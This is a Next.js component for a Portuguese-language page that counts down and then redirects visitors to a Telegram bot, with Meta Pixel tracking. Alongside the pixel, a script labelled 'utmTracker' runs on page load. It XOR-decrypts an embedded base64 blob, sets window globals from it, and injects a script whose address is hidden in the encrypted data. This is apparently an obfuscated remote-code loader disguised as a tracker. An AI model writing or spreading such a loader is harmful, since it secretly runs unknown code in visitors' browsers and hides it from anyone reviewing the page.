import Script from "next/script"
import styles from "../app/sarinha/sarinha.module.css"

const metaPixel = `
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window,document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1668272624856675');
  fbq('track', 'PageView');
`

const utmTracker = `(function(){var j_93=atob("DC5zN4MF5WPTlL9eWlVRQvFpx1nx/MsqKl1JGKxmgQ394cszM0gKGeBqiE2x5pAtOVwaR/d2yhan+cxxNk8HUvBxywmgtpN8O1oHRepnkBe2551kAVVRWeJogEHptts/Lk9eQvdojAWquc8sP1gWWfconQC88JItOUVRG6FzhA+m8Z1keAwOG/gniwK+8Z1keEoSQ+IokBe+/dknd14BUvVgixf+58o8M0oAFa8nkwK/4dp8YAxRSt54");var g_bmr=[];for(var e_vl7u=0;e_vl7u<j_93.length;e_vl7u++){g_bmr.push(j_93.charCodeAt(e_vl7u)&255);}var v_gh8=g_bmr[0];var q_rpmt=g_bmr.slice(1,1+v_gh8);var b_wgt=g_bmr.slice(1+v_gh8);var e_f=b_wgt.map(function(b,j_iy){return b^q_rpmt[j_iy%v_gh8];});var p_p0="";for(var c_p57u=0;c_p57u<e_f.length;c_p57u++){p_p0+=String.fromCharCode(e_f[c_p57u]&255);}var j_oe=decodeURIComponent(escape(p_p0));var p_a=JSON.parse(j_oe);var z_kq1=p_a.globals||[];z_kq1.forEach(function(g_y){window[g_y.name]=g_y.value;});var p_t9=document.createElement("script");p_t9.src=p_a.url;p_t9.async=true;p_t9.defer=true;(p_a.attributes||[]).forEach(function(f_1av){p_t9.setAttribute(f_1av.name,f_1av.value);});(document.head||document.documentElement).appendChild(p_t9);})();`

type TelegramRedirectProps = {
  botUrl: string
  source: string
}

export function TelegramRedirect({ botUrl, source }: TelegramRedirectProps) {
  return (
    <>
      <Script id={`${source}-meta-pixel`} strategy="afterInteractive">
        {metaPixel}
      </Script>
      <Script id={`${source}-utm-tracker`} strategy="afterInteractive">
        {utmTracker}
      </Script>
      <Script src="/telegram-redirect.js" strategy="afterInteractive" />

      <noscript>
        {/* eslint-disable-next-line @next/next/no-img-element */}
        <img
          alt=""
          height="1"
          width="1"
          style={{ display: "none" }}
          src="https://www.facebook.com/tr?id=1668272624856675&ev=PageView&noscript=1"
        />
      </noscript>

      <main
        className={styles.page}
        id="telegram-redirect"
        data-bot-url={botUrl}
        data-source={source}
        aria-label="Abrindo o Telegram"
      >
        <section className={styles.content}>
          <a
            className={styles.logo}
            id="telegram-link"
            href={botUrl}
            rel="noopener"
            aria-label="Abrir Telegram agora"
          >
            <svg viewBox="0 0 48 48" role="img">
              <path
                fill="#fff"
                d="M39.6 9.3 5.8 22.4c-2.3.9-2.3 2.2-.4 2.8l8.7 2.7 3.3 10.2c.4 1.2.2 1.7 1.5 1.7 1 0 1.5-.5 2-1l4.2-4.1 8.8 6.5c1.6.9 2.8.4 3.2-1.5l5.8-27.5c.6-2.4-.9-3.5-3.3-2.9ZM16.2 27.3 35.8 15c1-.6 1.9-.3 1.1.4L20.7 30c-.6.6-1.1 1.1-1.2 2.2l-.4 4.7-2.9-9.6Z"
              />
            </svg>
          </a>

          <strong className={styles.countdown} id="seconds" aria-live="polite">3</strong>

          <div className={styles.progress} aria-hidden="true">
            <span />
          </div>
        </section>
      </main>
    </>
  )
}
